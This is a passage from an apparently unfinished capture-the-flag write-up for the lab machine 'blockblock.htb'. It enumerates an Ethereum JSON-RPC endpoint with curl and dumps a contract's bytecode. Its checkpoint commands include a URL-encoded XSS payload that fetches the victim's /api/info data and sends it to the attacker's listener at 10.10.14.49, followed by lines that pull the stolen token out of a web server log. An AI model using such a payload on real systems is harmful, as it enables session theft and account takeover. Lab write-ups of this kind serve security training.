root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getBalance\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": "0x0"
}
```

### 4.2. Exporing the Ethereum json rpc

`eth_getBalance` is just one of the rpc calls available in the [json rpc docs](https://ethereum.org/en/developers/docs/apis/json-rpc/)

The `chat_address` should be of interest here, let's try other json rpc calls that use `address` in the docs

#### 4.2.1. `eth_getStorageAt`

Seems like storage location may not be too useful:

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getStorageAt\", \"params\": [\"$chataddr\",\"0x0\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": "0x0000000000000000000000000000000000000000000000000000000000000000"
}
```

#### 4.2.2. `eth_getTransactionCount`

Seems like only 1 transaction from this address:

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getTransactionCount\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": "0x1"
}
```

#### 4.2.3. `eth_getCode`

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getCode\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": "0x6080604052600436106100a05760003560e01c80635189875d116100645780635189875d14610168578063713b563f14610188578063804b644f146101d45780638da5cb5b146101f4578063a94c9b1814610228578063b8070c731461025657600080fd5b806315b25d30146100ac5780632686c3e8146100e45780633ccfd60b146101065780633f2f9f941461011b578063467fba0f1461014857600080fd5b366100a757005b600080fd5b3480156100b857600080fd5b506100cc6100c7366004611570565b61026b565b6040516100db93929190611602565b60405180910390f35b3480156100f057600080fd5b506101046100ff366004611638565b61055e565b005b34801561011257600080fd5b50610104610612565b34801561012757600080fd5b5061013b610136366004611570565b6106b2565b6040516100db919061167a565b34801561015457600080fd5b50610104610163366004611711565b610a54565b34801561017457600080fd5b5061013b610183366004611638565b610c90565b34801561019457600080fd5b506101bc7f00000000000000000000000075e41404c8c1de0c2ec801f06fbf5ace8662240f81565b6040516001600160a01b0390911681526020016100db565b3480156101e057600080fd5b5061013b6101ef366004611782565b610f35565b34801561020057600080fd5b506101bc7f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b81565b34801561023457600080fd5b50610248610243366004611638565b611316565b6040519081526020016100db565b34801561026257600080fd5b50610248611439565b6060806000336001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b16146102c15760405162461bcd60e51b81526004016102b8906117d3565b60405180910390fd5b85857f00000000000000000000000075e41404c8c1de0c2ec801f06fbf5ace8662240f6001600160a01b03166336980d3a83836040518363ffffffff1660e01b815260040161031192919061183d565b602060405180830381865afa15801561032e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103529190611859565b61036e5760405162461bcd60e51b81526004016102b890611882565b600088886040516103809291906118af565b9081526020016040518091039020868154811061039f5761039f6118bf565b9060005260206000209060030201600001600089896040516103c29291906118af565b908152602001604051809103902087815481106103e1576103e16118bf565b906000526020600020906003020160010160008a8a6040516104049291906118af565b90815260200160405180910390208881548110610423576104236118bf565b906000526020600020906003020160020154828054610441906118d5565b80601f016020809104026020016040519081016040528092919081815260200182805461046d906118d5565b80156104ba5780601f1061048f576101008083540402835291602001916104ba565b820191906000526020600020905b81548152906001019060200180831161049d57829003601f168201915b505050505092508180546104cd906118d5565b80601f01602080910402602001604051908101604052809291908181526020018280546104f9906118d5565b80156105465780601f1061051b57610100808354040283529160200191610546565b820191906000526020600020905b81548152906001019060200180831161052957829003601f168201915b50505050509150945094509450505093509350939050565b336001600160a01b037f00000000000000000000000075e41404c8c1de0c2ec801f06fbf5ace8662240f16146105e25760405162461bcd60e51b8152602060048201526024808201527f4f6e6c792064617461626173652063616e2063616c6c20746869732066756e636044820152633a34b7b760e11b60648201526084016102b8565b600082826040516105f49291906118af565b9081526020016040518091039020600061060e919061148a565b5050565b336001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b161461065a5760405162461bcd60e51b81526004016102b8906117d3565b6040516001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b16904780156108fc02916000818181858888f193505050501580156106af573d6000803e3d6000fd5b50565b6060336001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b16146106fc5760405162461bcd60e51b81526004016102b8906117d3565b83837f00000000000000000000000075e41404c8c1de0c2ec801f06fbf5ace8662240f6001600160a01b03166336980d3a83836040518363ffffffff1660e01b815260040161074c92919061183d565b602060405180830381865afa158015610769573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061078d9190611859565b6107a95760405162461bcd60e51b81526004016102b890611882565b600086866040516107bb9291906118af565b908152604051908190036020019020548411156107f757600086866040516107e49291906118af565b9081526040519081900360200190205493505b60008467ffffffffffffffff8111156108125761081261190f565b60405190808252806020026020018201604052801561086757816020015b61085460405180606001604052806060815260200160608152602001600081525090565b8152602001906001900390816108305790505b50905060005b85811015610a4957600088886040516108879291906118af565b9081526020016040518091039020818760008b8b6040516108a99291906118af565b908152604051908190036020019020546108c3919061193b565b6108cd9190611954565b815481106108dd576108dd6118bf565b9060005260206000209060030201604051806060016040529081600082018054610906906118d5565b80601f0160208091040260200160405190810160405280929190818152602001828054610932906118d5565b801561097f5780601f106109545761010080835404028352916020019161097f565b820191906000526020600020905b81548152906001019060200180831161096257829003601f168201915b50505050508152602001600182018054610998906118d5565b80601f01602080910402602001604051908101604052809291908181526020018280546109c4906118d5565b8015610a115780601f106109e657610100808354040283529160200191610a11565b820191906000526020600020905b8154815290600101906020018083116109f457829003601f168201915b50505050508152602001600282015481525050828281518110610a3657610a366118bf565b602090810291909101015260010161086d565b509695505050505050565b336001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b1614610a9c5760405162461bcd60e51b81526004016102b8906117d3565b83837f00000000000000000000000075e41404c8c1de0c2ec801f06fbf5ace8662240f6001600160a01b03166336980d3a83836040518363ffffffff1660e01b8152600401610aec92919061183d565b602060405180830381865afa158015610b09573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b2d9190611859565b610b495760405162461bcd60e51b81526004016102b890611882565b60008686604051610b5b9291906118af565b9081526020016040518091039020604051806060016040528086868080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250505090825250604080516020601f8b0181900481028201810190925289815291810191908a908a90819084018382808284376000920182905250938552505042602093840152508354600181018555938152208151919260030201908190610c0f90826119b6565b5060208201516001820190610c2490826119b6565b506040919091015160029091015560018054906000610c4283611a75565b9190505550426001547fa3dceacbd7fea253f50cea983bf77fbe5e9c416f5d9b805577dfe7c4d7988f8f88888888604051610c809493929190611a8e565b60405180910390a3505050505050565b6060336001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b1614610cda5760405162461bcd60e51b81526004016102b8906117d3565b82827f00000000000000000000000075e41404c8c1de0c2ec801f06fbf5ace8662240f6001600160a01b03166336980d3a83836040518363ffffffff1660e01b8152600401610d2a92919061183d565b602060405180830381865afa158015610d47573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d6b9190611859565b610d875760405162461bcd60e51b81526004016102b890611882565b60008585604051610d999291906118af565b9081526020016040518091039020805480602002602001604051908101604052809291908181526020016000905b82821015610f275783829060005260206000209060030201604051806060016040529081600082018054610dfa906118d5565b80601f0160208091040260200160405190810160405280929190818152602001828054610e26906118d5565b8015610e735780601f10610e4857610100808354040283529160200191610e73565b820191906000526020600020905b815481529060010190602001808311610e5657829003601f168201915b50505050508152602001600182018054610e8c906118d5565b80601f0160208091040260200160405190810160405280929190818152602001828054610eb8906118d5565b8015610f055780601f10610eda57610100808354040283529160200191610f05565b820191906000526020600020905b815481529060010190602001808311610ee857829003601f168201915b5050505050815260200160028201548152505081526020019060010190610dc7565b505050509250505092915050565b6060336001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b1614610f7f5760405162461bcd60e51b81526004016102b8906117d3565b84847f00000000000000000000000075e41404c8c1de0c2ec801f06fbf5ace8662240f6001600160a01b03166336980d3a83836040518363ffffffff1660e01b8152600401610fcf92919061183d565b602060405180830381865afa158015610fec573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110109190611859565b61102c5760405162461bcd60e51b81526004016102b890611882565b83851061106b5760405162461bcd60e51b815260206004820152600d60248201526c496e76616c69642072616e676560981b60448201526064016102b8565b6000878760405161107d9291906118af565b908152604051908190036020019020548411156110dc5760405162461bcd60e51b815260206004820152601760248201527f456e6420696e646578206f7574206f6620626f756e647300000000000000000060448201526064016102b8565b60006110e8868661193b565b67ffffffffffffffff8111156111005761110061190f565b60405190808252806020026020018201604052801561115557816020015b61114260405180606001604052806060815260200160608152602001600081525090565b81526020019060019003908161111e5790505b509050855b8581101561130a57600089896040516111749291906118af565b90815260200160405180910390208181548110611193576111936118bf565b90600052602060002090600302016040518060600160405290816000820180546111bc906118d5565b80601f01602080910402602001604051908101604052809291908181526020018280546111e8906118d5565b80156112355780601f1061120a57610100808354040283529160200191611235565b820191906000526020600020905b81548152906001019060200180831161121857829003601f168201915b5050505050815260200160018201805461124e906118d5565b80601f016020809104026020016040519081016040528092919081815260200182805461127a906118d5565b80156112c75780601f1061129c576101008083540402835291602001916112c7565b820191906000526020600020905b8154815290600101906020018083116112aa57829003601f168201915b505050505081526020016002820154815250508288836112e7919061193b565b815181106112f7576112f76118bf565b602090810291909101015260010161115a565b50979650505050505050565b6000336001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b16146113605760405162461bcd60e51b81526004016102b8906117d3565b82827f00000000000000000000000075e41404c8c1de0c2ec801f06fbf5ace8662240f6001600160a01b03166336980d3a83836040518363ffffffff1660e01b81526004016113b092919061183d565b602060405180830381865afa1580156113cd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906113f19190611859565b61140d5760405162461bcd60e51b81526004016102b890611882565b6000858560405161141f9291906118af565b908152604051908190036020019020549250505092915050565b6000336001600160a01b037f000000000000000000000000b795dc8a5674250b602418e7f804cd162f03338b16146114835760405162461bcd60e51b81526004016102b8906117d3565b5060015490565b50805460008255600302906000526020600020908101906106af91905b808211156114d95760006114bb82826114dd565b6114c96001830160006114dd565b50600060028201556003016114a7565b5090565b5080546114e9906118d5565b6000825580601f106114f9575050565b601f0160209004906000526020600020908101906106af91905b808211156114d95760008155600101611513565b60008083601f84011261153957600080fd5b50813567ffffffffffffffff81111561155157600080fd5b60208301915083602082850101111561156957600080fd5b9250929050565b60008060006040848603121561158557600080fd5b833567ffffffffffffffff81111561159c57600080fd5b6115a886828701611527565b909790965060209590950135949350505050565b6000815180845260005b818110156115e2576020818501810151868301820152016115c6565b506000602082860101526020601f19601f83011685010191505092915050565b60608152600061161560608301866115bc565b828103602084015261162781866115bc565b915050826040830152949350505050565b6000806020838503121561164b57600080fd5b823567ffffffffffffffff81111561166257600080fd5b61166e85828601611527565b90969095509350505050565b6000602082016020835280845180835260408501915060408160051b86010192506020860160005b8281101561170557603f1987860301845281518051606087526116c860608801826115bc565b9050602082015187820360208901526116e182826115bc565b604093840151989093019790975250945060209384019391909101906001016116a2565b50929695505050505050565b6000806000806040858703121561172757600080fd5b843567ffffffffffffffff81111561173e57600080fd5b61174a87828801611527565b909550935050602085013567ffffffffffffffff81111561176a57600080fd5b61177687828801611527565b95989497509550505050565b6000806000806060858703121561179857600080fd5b843567ffffffffffffffff8111156117af57600080fd5b6117bb87828801611527565b90989097506020870135966040013595509350505050565b60208082526021908201527f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6040820152603760f91b606082015260800190565b81835281816020850137506000828201602090810191909152601f909101601f19169091010190565b602081526000611851602083018486611814565b949350505050565b60006020828403121561186b57600080fd5b8151801515811461187b57600080fd5b9392505050565b602080825260139082015272155cd95c88191bd95cc81b9bdd08195e1a5cdd606a1b604082015260600190565b8183823760009101908152919050565b634e487b7160e01b600052603260045260246000fd5b600181811c908216806118e957607f821691505b60208210810361190957634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052604160045260246000fd5b634e487b7160e01b600052601160045260246000fd5b8181038181111561194e5761194e611925565b92915050565b8082018082111561194e5761194e611925565b601f8211156119b157806000526020600020601f840160051c8101602085101561198e5750805b601f840160051c820191505b818110156119ae576000815560010161199a565b50505b505050565b815167ffffffffffffffff8111156119d0576119d061190f565b6119e4816119de84546118d5565b84611967565b6020601f821160018114611a185760008315611a005750848201515b600019600385901b1c1916600184901b1784556119ae565b600084815260208120601f198516915b82811015611a485787850151825560209485019460019092019101611a28565b5084821015611a665786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b600060018201611a8757611a87611925565b5060010190565b604081526000611aa2604083018688611814565b8281036020840152611ab5818587611814565b97965050505050505056fea26469706673582212208f54c018e408713008070bbc6ae8ea405e46ebf2f2bf42f49332bf33b210893d64736f6c634300081a0033"
}
```

### 4.3. Work in progress

#### 4.3.0. Checkpoint commands

```sh
token=$(curl -s -H 'Content-Type: application/json' -d '{"username": "test", "password": "test"}' http://blockblock.htb/api/login | jq -r .'token')
systemctl start apache2
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -d '{"username": "%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F10.10.11.43%2Fapi%2Finfo%27%29.then%28response%20%3D%3E%20%7Breturn%20response.text%28%29%3B%7D%29.then%28dataFromA%20%3D%3E%20%7Breturn%20fetch%28%60http%3A%2F%2F10.10.14.49%2F%3Fd%3D%24%7BdataFromA%7D%60%29%7D%29%22%3E"}' http://blockblock.htb/api/report_user | jq
token=$(cat /var/log/apache2/access.log | cut -d '%' -f 8 | sed 's/22//')
chataddr=$(curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/chat_address | tr -d '"')
rpctoken=$(curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/json-rpc | jq -r .Authorization)
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getBalance\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getStorageAt\", \"params\": [\"$chataddr\",\"0x0\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getTransactionCount\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getCode\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
```

```sh
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x0",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x1",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x2",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x3",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x4",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x5",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x6",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x7",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x8",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x9",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xa",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xb",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xc",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xd",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xe",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xf",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
```

#### 4.3.1. Decompiling the Ethereum contract

https://ethervm.io/decompile

#### 4.3.2. Compiling chat.soi into abi

https://remix.ethereum.org/

#### 4.3.3. Decode Ethereum input data

https://lab.miguelmota.com/ethereum-input-data-decoder/example/
